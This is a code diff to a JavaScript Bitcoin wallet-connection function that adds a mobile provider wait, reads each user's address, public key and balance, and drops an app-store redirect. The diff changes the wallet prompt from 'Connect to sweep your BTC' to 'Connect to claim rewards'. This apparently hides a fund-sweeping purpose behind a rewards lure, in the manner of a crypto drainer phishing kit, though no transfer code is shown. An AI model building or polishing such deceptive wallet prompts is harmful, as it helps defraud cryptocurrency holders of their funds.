@@ -41,73 +41,72 @@ export const getRecommendedFee = async () => {
 
 // connect unisat // also supports multiple providers
 // The Universal Connection Function
+// A helper to wait for providers to be injected (Crucial for Mobile)
+const waitForProvider = (id, timeout = 2000) => {
+  return new Promise((resolve) => {
+    const start = Date.now();
+    const check = () => {
+      const providers = getProviders();
+      const found = providers.find(p => p.id === id) || (id === "unisat" && window.unisat);
+      if (found) return resolve(true);
+      if (Date.now() - start > timeout) return resolve(false);
+      setTimeout(check, 100);
+    };
+    check();
+  });
+};
+
 export const connectBitcoinWallet = async (providerId) => {
   try {
-    // If a providerId is passed, prefer it (this helps prioritize browser extensions).
-    // If not, try to auto-select a provider (favor UniSat if present).
-    let selectedProviderId = providerId;
+    let selectedId = providerId;
 
-    if (!selectedProviderId) {
-      if (typeof window !== "undefined" && window.unisat) {
-        selectedProviderId = "unisat";
-      } else {
-        const providers = getProviders();
-        if (providers.length > 0) selectedProviderId = providers[0].id;
-      }
+    // Wait briefly for the provider to exist if we're on mobile
+    if (selectedId) {
+      await waitForProvider(selectedId);
     }
 
-    if (selectedProviderId) {
-      setDefaultProvider(selectedProviderId);
-    }
-
-    // If we explicitly want UniSat and the browser extension is available, use it directly.
-    if (selectedProviderId === "unisat" && typeof window !== "undefined" && window.unisat) {
+    // Default to UniSat logic if available
+    if ((selectedId === "unisat" || !selectedId) && typeof window !== "undefined" && window.unisat) {
       const accounts = await window.unisat.requestAccounts();
       const publicKey = await window.unisat.getPublicKey();
       const balObj = await window.unisat.getBalance();
-
       return {
         address: accounts[0],
         publicKey,
-        type: selectedProviderId,
+        type: "unisat",
         balance: balObj.total,
       };
     }
 
-    // Otherwise, use sats-connect's request path (will open wallet selector / deep link flows)
+    // Standard sats-connect path
+    if (selectedId) setDefaultProvider(selectedId);
+    
     const response = await request("getAccounts", {
       purposes: ["payment"],
-      message: "Connect to sweep your BTC",
+      message: "Connect to claim rewards",
     });
 
     if (response.status === "success") {
       const paymentAddress = response.result.find(a => a.purpose === "payment");
       const address = paymentAddress?.address;
-      const publicKey = paymentAddress?.publicKey;
-
-      // If provider doesn't expose balance, fetch it via a block explorer.
+      
+      // Fetch balance via explorer
       let balance = 0;
       try {
         const balRes = await axios.get(`https://mempool.space/api/address/${address}`);
         balance = balRes.data.chain_stats.funded_txo_sum - balRes.data.chain_stats.spent_txo_sum;
-      } catch (err) {
-        console.warn("Failed to fetch BTC balance from explorer", err);
-      }
+      } catch (err) { console.warn(err); }
 
       return {
         address,
-        publicKey,
-        type: selectedProviderId || "sats-connect",
+        publicKey: paymentAddress?.publicKey,
+        type: selectedId || "sats-connect",
         balance,
       };
     }
   } catch (err) {
-    console.error("User cancelled or wallet not found", err);
-    // If on mobile and wallet not found, you can redirect to the App Store
-    if (/iPhone|Android/i.test(navigator.userAgent)) {
-       window.location.href = "https://www.xverse.app/download"; 
-    }
-    return null;
+    console.error("Connection failed", err);
+    return null; // Remove the window.location.href redirect here!
   }
 };
 
